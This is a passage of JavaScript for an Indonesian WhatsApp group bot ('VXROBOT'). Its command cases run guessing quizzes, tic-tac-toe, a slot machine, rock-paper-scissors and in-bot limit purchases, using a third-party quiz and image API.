			case 'naruto':
			case 'minato':
			case 'sagiri':
			case 'sasuke':
			case 'sakura':
			case 'tsunade':
			case 'gojosatoru':
				if (isBanned) return reply(mess.baned)
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				reply(mess.wait)
				query = args
					.join(" ")
				anu =
					await fetchJson(
						`https://api.lolhuman.xyz/api/pinterest?apikey=vxro2k21&query=${command}`, {
							method: 'get'
						})
						anu = anu.result
				ngebuff =
					await getBuffer(anu)
				varo
					.sendMessage(
						from,
						ngebuff,
						image, {caption: command,
							quoted: mek
						})
						limitAdd(sender,
							limit)
				break

			case 'tictactoe':
			case 'ttt':
			case 'ttc':
				if (isBanned) return reply(mess.baned)
				if (!isGroup)
					return reply(
						'Perintah hanya bisa digunakan di dalam group'
						)
				//	if (!isRegistered) return reply(ind.noregis())
				if (mek.message
					.extendedTextMessage ===
					undefined ||
					mek.message
					.extendedTextMessage ===
					null)
				return reply(
						'Command untuk bermain tictactoe online dengan cara tag target\n\nExample : ${prefix+command} @tag'
						)
				mentioned = mek
					.message
					.extendedTextMessage
					.contextInfo
					.mentionedJid
				if (isTicTacToe(
						from,
						tictactoe
						))
					return reply(
						`Masih ada sesi game disini`
						)
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (args
					.length < 0)
					return reply(
						`Command untuk bermain tictactoe online dengan cara tag target\n\nExample : ${prefix+command} @tag`
						)
				if (mentioned
					.length !==
					0) {
					if (mentioned[
							0
							] ===
						sender)
						return reply(
							`Sedih amat main sama diri sendiri`
							)
					let h =
						randomNomor(
							1000
							)
					mentions(
						monospace(
							`@${sender.split('@')[0]} menantang @${mentioned[0].split('@')[0]} untuk bermain TicTacToe\n\nKirim (Y/T) untuk bermain\n\nHadiah : ${h} balance\n${prefix}delttt untuk membatalkan`
							),
						[sender,
							mentioned[
								0
								]
						],
						false
						)
					tictactoe
						.push({
							id: from,
							status: null,
							hadiah: h,
							penantang: sender,
							ditantang: mentioned[
								0
								],
							TicTacToe: [
								'1️⃣',
								'2️⃣',
								'3️⃣',
								'4️⃣',
								'5️⃣',
								'6️⃣',
								'7️⃣',
								'8️⃣',
								'9️⃣'
							]
						})
				} else {
					reply(
						`Command untuk bermain tictactoe online dengan cara tag target\n\nExample : ${prefix+command} @tag`)
				}
				break
			case 'delttt':
			case 'delttc':
				if (isBanned) return reply(mess.baned)
				if (!isGroup)
					return reply(
						'Perintah hanya bisa digunakan di dalam group'
						)
				//   if (!isRegistered) return reply(ind.noregis())
				if (!
					isTicTacToe(
						from,
						tictactoe
						))
					return reply(
						`Tidak ada sesi game tictactoe di grup ini`
						)
				tictactoe
					.splice(
						getPosTic(
							from,
							tictactoe
							), 1
						)
				reply(
					`Berhasil menghapus sesi tictactoe di grup ini`)
				break
			case 'tebakgambar':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (tebakgambar
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Selesaikan yang sebelumnya!"
						)
				get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/tebak/gambar?apikey=vxro2k21`
						)
                                get_result = get_result.result
				ini_image =
					get_result
					.image
				jawaban =
					get_result
					.answer
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				ini_buffer =
					await getBuffer(
						ini_image
						)
				varo
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :' +
								kisi_kisi +
								'\nWaktu : 60 detik'
						}).then(
						() => {
							tebakgambar
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakgambar.json",
								JSON
								.stringify(
									tebakgambar
									)
								)
						})
				await sleep(
					60000)
				if (tebakgambar
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("*Jawaban*: " +
						jawaban
						)
					delete tebakgambar
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebakgambar.json",
						JSON
						.stringify(
							tebakgambar
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'siapaaku':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (tebaksiapaaku
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yg belum terjawab"
						)
				get_result =
					await fetchJson(
						`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.answer
				kisi_kisi =
					jawaban
					.replace(
						/[B|C|D|F|G|H|J|K|L|M|N|P|Q|R|S|T|V|W|X|Y|Z]/gi,
						'_')
				pertanyaan =
					get_result
					.question
				varo
					.sendMessage(
						from,
						'   ```| Tebak Siapakah Aku |```\n\n▷ *Soal* : ' +
						pertanyaan +
						'\n▷ *Kisi²* : ' +
						kisi_kisi + '\n\nWaktu : 60 detik',
						text, {
							quoted: mek
						}).then(
						() => {
							tebaksiapaaku
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebaksiapaaku.json",
								JSON
								.stringify(
									tebaksiapaaku
									)
								)
						})
				await sleep(
					`${waktu}`
					)
				if (tebaksiapaaku
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete tebaksiapaaku
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebaksiapaaku.json",
						JSON
						.stringify(
							tebaksiapaaku
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'buyglimit': {
				if (isBanned) return reply(mess.baned)
				if (!q) return reply(
					`Command untuk membeli game limit menggunakan uang yang kamu punya\n\nExample : ${prefix + command} 10\n\nHarga 1 limit = $300 balance`
					)
				const
					koinPerlimit =
					300
				jg = `id`
				const total =
					koinPerlimit *
					q
				if (getBalance(
						sender,
						balance
						) <=
					total)
					return reply(
						`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`
						)
				kurangBalance(
					sender,
					total,
					balance)
				givegame(sender,
					q,
					glimit)
				reply(`Pembeliaan game limit sebanyak ${q} berhasil!\n\nSisa Balance : $${getBalance(sender, balance)},\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`)
                                        break
}
case 'buylimit': {
	if (isBanned) return reply(mess.baned)
	if (!q) return reply(
		`Command untuk membeli limit bot menggunakan uang yang kamu punya\n\nExample : ${prefix + command} 10\n\nHarga 1 limit = $500 balance`
		)
	const
		koinPerlimitny =
		500
	jg = `id`
	const totalny =
		koinPerlimitny *
		q
	if (getBalance(
			sender,
			balance
			) <=
		totalny)
		return reply(
			`Maaf uang kamu belum mencukupi. silahkan kumpulkan dan beli nanti`
			)
	kurangBalance(
		sender,
		totalny,
		balance)
	giveLimit(sender,
		q,
		limit)
	reply(`Pembeliaan game limit sebanyak ${q} berhasil!\n\nSisa Balance : $${getBalance(sender, balance)},\nSisa Limit Bot : ${getLimit(sender, limitCount, limit)}/${limitCount}`)
							break
}
			case 'tebakkata':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (tebakata
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yang belum terjawab"
						)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/kata?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.jawaban
				pertanyaan =
					get_result
					.pertanyaan
				varo
					.sendMessage(
						from,
						'   ```| Tebak Kata |```\n\n▷ *Soal* : ' +
						pertanyaan +
						'\n▷ *Waktu* : 60 detik',
						text, {
							quoted: mek
						}).then(
						() => {
							tebakata
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
jawaban.toLowerCase()
							fs.writeFileSync(
								"./database/tebakata.json",
								JSON
								.stringify(
									tebakata
									)
								)
						})
				await sleep(
					60000)
				if (tebakata
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete tebakata
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebakata.json",
						JSON
						.stringify(
							tebakata
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'tebaklirik':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (tebaklirik
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yang belum terjawab"
						)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/lirik?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.answer
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.question
				varo
					.sendMessage(
						from,
						'   ```| Tebak Lirik |```\n\n▷ *Soal* : ' +
						pertanyaan +
						'\n▷ *Kisi²* : ' +
						kisi_kisi + '\n\nWaktu : 60 detik',
						text, {
							quoted: mek
						}).then(
						() => {
							tebaklirik
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebaklirik.json",
								JSON
								.stringify(
									tebaklirik
									)
								)
						})
				await sleep(
					60000)
				if (tebaklirik
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete tebaklirik
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebaklirik.json",
						JSON
						.stringify(
							tebaklirik
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'leavetime':
				if (isBanned) return reply(mess.baned)
				if (!isGroup)
					return reply(
						mess
						.only
						.group
						)
				if (!isOwner &&
					!mek.key
					.fromMe)
					return sticOwner(
						from
						)
				if (args[1] ==
					"detik") {
					var timer =
						args[
						0] +
						"000"
				} else if (args[
						1] ==
					"menit") {
					var timer =
						args[
						0] +
						"0000"
				} else if (args[
						1] ==
					"jam") {
					var timer =
						args[
						0] +
						"00000"
				} else {
					return reply(
						"*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik"
						)
				}
				setTimeout(
				() => {
						varo
							.groupLeave(
								from
								);
					},
					timer)
			case 'tebakjenaka':
				if (isBanned) return reply(mess.baned) 
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (tebakjenaka
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yg belum terjawab"
						)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/jenaka?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.answer
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.question
				varo
					.sendMessage(
						from,
						'   ```| Tebak Jenaka |```\n\n▷ *Soal* : ' +
						pertanyaan +
						'\n▷ *Kisi²* : ' +
						kisi_kisi + '\n\nWaktu : 60 detik',
						text, {
							quoted: mek
						}).then(
						() => {
							tebakjenaka
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakjenaka.json",
								JSON
								.stringify(
									tebakjenaka
									)
								)
						})
				await sleep(
					60000)
				if (tebakjenaka
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete tebakjenaka
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebakjenaka.json",
						JSON
						.stringify(
							tebakjenaka
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'kimiakuis':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (tebakimia
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yang belum terjawab"
						)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.lambang
				pertanyaan =
					get_result
					.nama
				varo
					.sendMessage(
						from,
						'   ```| Tebak Kimia |```\n\n▷ *Soal* : ' +
						pertanyaan +
						'\n▷ *Waktu :* 60 detik',
						text, {
							quoted: mek
						}).then(
						() => {
							tebakimia
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakimia.json",
								JSON
								.stringify(
									tebakimia
									)
								)
						})
				await sleep(
					60000)
				if (tebakimia
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete tebakimia
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebakimia.json",
						JSON
						.stringify(
							tebakimia
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'tebakbendera':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (tebakbendera
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yang belum terjawab"
						)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/bendera?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.name
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.flag
				varo
					.sendMessage(
						from,
						'   ```| Tebak Bendera |```\n\n▷ *Bendera* : ' +
						pertanyaan +
						'\n▷ *Kisi²* : ' +
						kisi_kisi + '\n\nWaktu : 60 detik',
						text, {
							quoted: mek
						}).then(
						() => {
							tebakbendera
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/tebakbendera.json",
								JSON
								.stringify(
									tebakbendera
									)
								)
						})
				await sleep(
					60000)
				if (tebakbendera
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete tebakbendera
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/tebakbendera.json",
						JSON
						.stringify(
							tebakbendera
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'susunkata':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (susunkata
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yang belum terjawab"
						)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/susunkata?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.jawaban
				pertanyaan =
					get_result
					.pertanyaan
				varo
					.sendMessage(
						from,
						'   ```| Susun Kata |```\n\n▷ *Soal* : ' +
						pertanyaan +
						'\n▷ *Waktu :* 60 detik',
						text, {
							quoted: mek
						}).then(
						() => {
							susunkata
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/susunkata.json",
								JSON
								.stringify(
									susunkata
									)
								)
						})
				await sleep(
					60000)
				if (susunkata
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete susunkata
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/susunkata.json",
						JSON
						.stringify(
							susunkata
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'asahotak':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (asahotak
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yang belum terjawab"
						)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/asahotak?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.jawaban
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.pertanyaan
				varo
					.sendMessage(
						from,
						'   ```| Asah Otak |```\n\n▷ *Soal* : ' +
						pertanyaan +
						'\n▷ *Kisi²* : ' +
						kisi_kisi + '\n\nWaktu : 60 detik',
						text, {
							quoted: mek
						}).then(
						() => {
							asahotak
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/asahotak.json",
								JSON
								.stringify(
									asahotak
									)
								)
						})
				await sleep(
					60000)
				if (asahotak
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete asahotak
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/asahotak.json",
						JSON
						.stringify(
							asahotak
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'caklontong':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (isGame(
						sender,
						isPremium,
						gcount,
						glimit))
					return reply(
						`Limit game kamu sudah habis\n\nKetik *${prefix}limitgame* untuk cek limit`
						)
				if (caklontong
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						))
					return reply(
						"Masih ada soal yang belum terjawab"
						)
				get_result =
					await fetchJson(
						`http://api.lolhuman.xyz/api/tebak/caklontong2?apikey=vxro2k21`
						)
				get_result =
					get_result
					.result
				jawaban =
					get_result
					.answer
				kisi_kisi =
					jawaban
					.replace(
						/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi,
						'_')
				pertanyaan =
					get_result
					.question
				varo
					.sendMessage(
						from,
						'   ```| Caklontong |```\n\n▷ *Soal* : ' +
						pertanyaan +
						'\n▷ *Kisi²* : ' +
						kisi_kisi + '\n\nWaktu : 60 detik',
						text, {
							quoted: mek
						}).then(
						() => {
							caklontong
								[sender
									.split(
										'@'
										)[
										0
										]
									] =
								jawaban
								.toLowerCase()
							fs.writeFileSync(
								"./database/caklontong.json",
								JSON
								.stringify(
									caklontong
									)
								)
						})
				await sleep(
					60000)
				if (caklontong
					.hasOwnProperty(
						sender
						.split(
							'@'
							)[0]
						)) {
					console.log(
						color(
							"Jawaban: " +
							jawaban
							)
						)
					reply("Jawaban: " +
						jawaban
						)
					delete caklontong
						[sender
							.split(
								'@'
								)[
								0
								]
							]
					fs.writeFileSync(
						"./database/caklontong.json",
						JSON
						.stringify(
							caklontong
							)
						)
				}
				gameAdd(sender,
					glimit)
				break
			case 'slot':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				const sotoy = [
					'🍊 : 🍒 : 🍐',
					'🍒 : ?? : 🍊',
					'?? : 🍒 : 🍐',
					'🍊 : 🍋 : 🔔',
					'🔔 : 🍒 : 🍐',
					'🔔 : 🍒 : 🍊',
					'🍊 : 🍋 : 🔔',
					'🍐 : 🍒 : 🍋',
					'🍐 : 🍐 : 🍐',
					'🍊 : 🍒 : 🍒',
					'🔔 : 🔔 : 🍇',
					'🍌 : 🍒 : 🔔',
					'🍐 : 🔔 : 🔔',
					'🍊 : 🍋 : 🍒',
					'🍋 : 🍋 : 🍌',
					'🔔 : 🔔 : 🍇',
					'🔔 : 🍐 : 🍇',
					'🔔 : 🔔 : 🔔',
					'🍒 : 🍒 : 🍒',
					'🍌 : 🍌 : 🍌',
					'🍇 : ?? : 🍇'
				]
				somtoy = sotoy[
					Math
					.floor(
						Math
						.random() *
						(sotoy
							.length
							)
						)]
				somtoyy = sotoy[
					Math
					.floor(
						Math
						.random() *
						(sotoy
							.length
							)
						)]
				somtoyyy =
					sotoy[Math
						.floor(
							Math
							.random() *
							(sotoy
								.length
								)
							)]
				if (somtoyy ==
					'🍌 : 🍌 : 🍌'
					) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
				} else if (
					somtoyy ==
					'?? : 🍒 : 🍒'
					) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
				} else if (
					somtoyy ==
					'🔔 : 🔔 : 🔔'
					) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
				} else if (
					somtoyy ==
					'?? : 🍐 : 🍐'
					) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
				} else if (
					somtoyy ==
					'🍇 : 🍇 : 🍇'
					) {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
				} else {
					reply(
						`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
				}
				break

			case 'suit':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				buttons = [{
					buttonId: `${prefix}ok batu`,
					buttonText: {
						displayText: 'BATU'
					},
					type: 1
				}, {
					buttonId: `${prefix}ok kertas`,
					buttonText: {
						displayText: 'KERTAS'
					},
					type: 1
				}, {
					buttonId: `${prefix}ok gunting`,
					buttonText: {
						displayText: 'GUNTING'
					},
					type: 1
				}]

				buttonsMessage
				= {
					contentText: `SUIT GAME`,
					footerText: 'VXROBOT©2022',
					buttons: buttons,
					headerType: 1
				}

				prep =
					await varo
					.prepareMessageFromContent(
						from, {
							buttonsMessage
						}, {
							quoted: mek
						})
				varo
					.relayWAMessage(
						prep)
				break
			case 'ok': //nyolong dari zenz
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				if (!q) return reply(
					`Kirim perintah ${prefix}suit`
					)
				const
					userspilih =
					q
				if (!userspilih
					.match(
						/batu|gunting|kertas/
						))
					return reply(
						`Pilih batu, kertas, gunting`
						)
				var computer =
					Math
					.random();
				if (computer <
					0.34) {
					computer =
						'batu';
				} else if (
					computer >=
					0.34 &&
					computer <
					0.67) {
					computer =
						'gunting';
				} else {
					computer =
						'kertas';
				}
				if (userspilih ==
					computer) {
					reply(
						`Pertandingan Seri!`)
				} else if (
					userspilih ==
					'batu') {
					if (computer ==
						'gunting'
						) {
						reply(
							`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
					} else {
						reply(
							`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
					}
				} else if (
					userspilih ==
					'gunting') {
					if (computer ==
						'batu'
						) {
						reply(
							`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
					} else {
						reply(
							`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
					}
				} else if (
					userspilih ==
					'kertas') {
					if (computer ==
						'batu'
						) {
						reply(
							`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
					} else {
						reply(
